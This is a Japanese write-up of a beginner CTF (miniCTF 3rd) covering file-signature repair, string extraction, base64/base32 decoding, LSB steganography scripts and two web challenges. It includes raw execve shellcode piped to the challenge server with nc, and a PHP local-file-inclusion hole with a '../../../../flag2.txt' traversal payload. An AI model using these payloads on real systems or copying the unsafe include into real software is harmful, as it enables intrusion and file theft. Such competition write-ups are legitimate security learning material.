---
title: "miniCTF 3rd write-up"
date: 2020-01-31T14:14:46+09:00
Categories: ["write-up"]
---

ソロでチーム"helix"として参加した。1001 点を獲得し、順位は 9 位だった。


## 00 Welcome
自明

`NITAC{sup3r_dup3r_sc0re_serv3r}`

## 01 signature
`signature`ファイルの中身を確認する。
```bash
$ file signature 
signature: ELF (Tru64), unknown class 13

$ xxd signature | head
00000000: 7f45 4c46 0d0a 1a0a 0000 000d 4948 4452  .ELF........IHDR
00000010: 0000 0423 0000 021d 0806 0000 0007 efb7  ...#............
00000020: 2f00 0000 0473 4249 5408 0808 087c 0864  /....sBIT....|.d
00000030: 8800 0000 1974 4558 7453 6f66 7477 6172  .....tEXtSoftwar
00000040: 6500 676e 6f6d 652d 7363 7265 656e 7368  e.gnome-screensh
00000050: 6f74 ef03 bf3e 0000 1c96 4944 4154 789c  ot...>....IDATx.
00000060: eddd 39b2 eb46 8205 5042 f1b7 2347 a6ca  ..9..F..PB..#G..
00000070: d652 2ab4 2679 b595 72e4 7d4b 0ba8 4db4  .R*.&y..r.}K..M.
00000080: cf36 a427 bd91 c490 7973 3a27 a28c 16fa  .6.'....ys:'....
00000090: f381 891c 2f13 c0f6 cb2f bfdc 6f00 0000  ..../..../..o...
```
識別子は`ELF`だが`IHDR`や`IDAT`の文字からpngっぽいということで`7f45 4c46`を`8950 4e47`に変えるとフラグが手に入る。

`NITAC{dr4win9}`

## 02 shellcode

`shellcode`ファイルの中身を確認する。

```bash
$ file shellcode 
shellcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3658bbbb3a87143505daa8ebe8bc00220aa93cc1, not stripped
```

問題名から察したので[http://shell-storm.org](http://shell-storm.org)から`x86-64`用のシェルコードを適当に探して投げてみる。

```bash
$ (echo -e "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";cat) | nc <url>
I will execute your code instead of you. Give me machine code bytes: ls
flag.txt
redir.sh
shellcode
cat flag.txt
NITAC{I_g4ve_up_cr0ss_comp1ling}
```

フラグが手に入る。

`NITAC{I_g4ve_up_cr0ss_comp1ling}`

## 03 wrong copy

`program`ファイルの中身を確認する。

```bash
$ file program
program: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=007c9b3494e08ccacaf16692de872fe3b817ae26, for GNU/Linux 3.2.0, not stripped
```

とりあえず`strings`をかけてみる。

```bash
$ strings program
... (省略)
u+UH
NITAC{c0H
py_15_d1H
ff1cul7}
[]A\A]A^A_
... (省略)
```

それっぽい文字列が見つかるが`H`が途中に混ざっているので除去するとフラグが手に入る。

`NITAC{c0py_15_d1ff1cul7}`

## 08 base64

`encoded.txt`ファイルの中身を確認する。

```bash
$ cat encoded.txt
TklUQUN7RE9fWU9VX0tOT1dfQkFTRTY0P30K
```

問題文に従って、デコードする。

```bash
$ cat encoded.txt | base64 -d
NITAC{DO_YOU_KNOW_BASE64?}
```

フラグが得られる。

`NITAC{DO_YOU_KNOW_BASE64?}`

## 12 flower

暗号化スクリプト`encrypt.py`と、ファイル`flower.png` 、`enc_flower.png`が渡される。

`encrypt.py`を確認する。

```python
import cv2
import numpy as np

img = cv2.imread('flower.png')

flag = ''.join([bin(ord(x))[2:].zfill(8) for x in list(input("input flag: "))])
flag += '0' * (img.shape[0] * img.shape[1] * img.shape[2] - len(flag))

print(flag)
print(len(flag))

enc_img = []

cnt = 0

for i in img:
    img_line = []
    for j in i:
        r, g, b = [[y for y in list(bin(x)[2:])] for x in j]
        r[-1] = flag[cnt]
        g[-1] = flag[cnt + 1]
        b[-1] = flag[cnt + 2]
        cnt += 3
        img_line.append([int(x, 2) for x in [''.join(r), ''.join(g), ''.join(b)]])
    enc_img.append(img_line)
cv2.imwrite('enc_flower.png', np.array(enc_img))
```

面倒くさかったので、脳死で復号スクリプトを書いた。

```python
import cv2

img = cv2.imread('enc_flower.png')

flag = []

for i in img:
    for j in i:
        r, g, b = [[y for y in list(bin(x)[2:])] for x in j]
        flag.append(r[-1])
        flag.append(g[-1])
        flag.append(b[-1])

for i in range(0, len(flag), 8):
    print(chr(int(''.join(flag[i:i+8]), 2)), end='')
```

実行するとフラグが手に入る。

```bash
$ python decrypt.py | less
NITAC{LSB_full_search}^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
lines 1-1/1 (END)
```

`NITAC{LSB_full_search}`

## 15 Teacher's Server

フラグが`base32`で暗号化されているとのことなので、`Network1.pcapng`を`strings`にかけてみる

```bash
$ strings Network1.pcapng
... (省略)
Date: Sat, 28 Dec 2019 07:20:42 GMT
Connection: keep-alive
flag: JZEVIQKDPNEVGQKPL5EVGX2NIFKEQRKNIFKESQ2JIFHH2===
Counters provided by dumpcap
```

いかにもな文字列を見つけたのでデコードする。

```bash
$ echo JZEVIQKDPNEVGQKPL5EVGX2NIFKEQRKNIFKESQ2JIFHH2=== | base32 -d
NITAC{ISAO_IS_MATHEMATICIAN}
```

フラグが手に入る。

## 17 Admin Portal 1

Webサイトのソースが渡される。サイトには登録のためのリンクがないが、ソースを読むと`register.php`で受け付けていることがわかるので適当に登録する。その後、サイトからログインするとフラグが表示されている。

`NITAC{00f_r3g1str4t10n_st1ll_w0rks}`

## 18 Admin Portal 2

ソースを更に読むと、`index.php`に以下のようなコードがあることに気づく。

```php
<?php include("templates/" . $_GET['lang']); ?>
```

このコードを利用すると`lang`パラメータの変更で好きなファイルを読むことができる。また問題文より、フラグは`/flag2.txt`に存在することがわかっている。

そこで`lang`パラメータに適当な値を入力していくと、`../../../../flag2.txt`でフラグを手に入れることができた。

`NITAC{n0w_u_kn0w_h0w_LFI_w0rks}`

## JWT auth

メモを取り忘れたので省略。

## 総括

自明問題しか解けていないように感じた。
